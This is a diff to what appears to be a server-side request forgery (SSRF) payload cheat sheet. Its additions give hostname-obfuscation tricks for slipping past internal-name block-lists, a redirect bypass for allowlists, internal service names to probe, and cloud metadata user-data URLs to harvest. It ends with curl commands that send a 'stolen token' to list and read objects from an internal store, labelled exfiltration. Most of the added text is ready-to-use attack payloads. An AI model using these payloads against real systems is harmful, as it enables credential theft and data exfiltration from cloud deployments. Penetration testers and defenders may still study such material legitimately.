@@ -101,6 +101,32 @@ http://127.0.0.1/%61dmin
 http://127.0.0.1/%2561dmin   (double encoding)
 ```
 
+## Hostname-String Bypass (obfuscate an internal NAME)
+
+When the guard is a host-string allow/block-list (not an IP check), the resolver still connects but the string match misses. Example name `imds` / `metadata.internal`:
+
+```
+http://IMDS./                          # upper-case (string check often case-sensitive)
+http://Imds/                           # mixed case
+http://imds./                          # trailing dot (FQDN root label)
+http://metadata.internal./             # trailing dot on a multi-label name
+http://%69%6d%64%73/                   # percent-encoded host bytes = "imds"
+http://%6d%65%74%61%64%61%74%61.internal/   # percent-encoded "metadata"
+```
+
+For an allowlist keyed on an approved public domain, point that approved host (or your own 30x) at internal infra and let the fetcher follow the redirect.
+
+## Conventional Internal Service Names
+
+In container/compose/k8s deployments, internal services answer to DNS service names — not only loopback or metadata IPs. Enumerate these alongside the metadata IPs (`localhost`/`127.0.0.1` reaches only the app itself):
+
+```
+http://imds/            http://metadata/        http://metadata.internal/
+http://store/           http://objstore/        http://s3/
+http://db/              http://redis/           http://api/
+# plus the deployment's own compose/k8s service name for the target backend
+```
+
 ## Cloud Metadata Endpoints
 
 ### AWS (IMDSv1)
@@ -157,6 +183,34 @@ http://169.254.169.254/metadata/v1/user-data
 ```
 http://127.0.0.1:2379/v2/keys/
 curl -s http://127.0.0.1:10255/pods
+```
+
+## User-Data / Startup-Script Breadcrumb Endpoints
+
+The credential document may not name the next hop — user-data / metadata attributes do (internal object-store endpoint, bucket name, DB host). Always read these per cloud:
+
+```
+# AWS
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/dynamic/instance-identity/document
+# GCP (Metadata-Flavor: Google)
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script
+# Azure (Metadata: true) — customData is base64
+http://169.254.169.254/metadata/instance/compute/customData?api-version=2021-02-01
+# DigitalOcean
+http://169.254.169.254/metadata/v1/user-data
+```
+
+## Pivot: List Bucket, Then Read Object (forward the stolen token)
+
+List FIRST to learn the key (discovery), THEN read the object (exfil). A store that 403s without the credential but serves with it confirms the chain:
+
+```bash
+# 1. LIST — discovery
+curl -s -H "Authorization: Bearer $STOLEN_TOKEN" "http://objstore.internal/buckets/$BUCKET/"
+# 2. READ the named object — attacker outcome
+curl -s -H "Authorization: Bearer $STOLEN_TOKEN" "http://objstore.internal/buckets/$BUCKET/$KEY"
 ```
 
 ## Useful curl Examples
